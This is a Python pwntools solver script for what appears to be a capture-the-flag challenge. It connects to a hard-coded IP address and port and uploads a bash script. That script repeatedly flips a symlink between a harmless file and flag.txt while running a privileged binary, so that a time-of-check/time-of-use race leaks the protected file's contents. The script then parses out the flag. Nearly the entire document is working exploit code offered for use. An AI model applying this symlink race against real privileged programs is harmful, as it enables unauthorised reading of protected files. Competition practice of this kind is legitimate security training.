#!/usr/bin/env python3
from pwn import remote, context
import re

context.log_level = "error"

HOST = "34.131.216.230"
PORT = 1338

RACE_SCRIPT = r'''cat > race2.sh <<'EOF'
#!/bin/bash
printf "Welcome, 8r@v3_H@ck3r.\n\nIf you're reading this, you've already done more work than most people.\n" > safe.txt
ln -sfn safe.txt welcome.txt
(
  while :; do
    ln -sfn safe.txt welcome.txt
    ln -sfn flag.txt welcome.txt
  done
) &
flip=$!
for i in $(seq 1 500000); do
  out=$(./challenge 2>/dev/null)
  if [[ "$out" == *"{"*"}"* ]]; then
    echo "$out"
    kill $flip 2>/dev/null
    exit 0
  fi
done
kill $flip 2>/dev/null
exit 1
EOF
chmod +x race2.sh
./race2.sh
'''


def solve():
    io = remote(HOST, PORT)
    io.recvuntil(b"$ ")
    io.send(RACE_SCRIPT.encode())

    data = io.recvrepeat(8).decode(errors="ignore")
    m = re.search(r"IIITL\{[^\n}]*\}", data)
    if m:
        flag = m.group(0)
        print(flag)
        return flag

    print("[!] Flag not found, raw output:")
    print(data)
    return None


if __name__ == "__main__":
    solve()
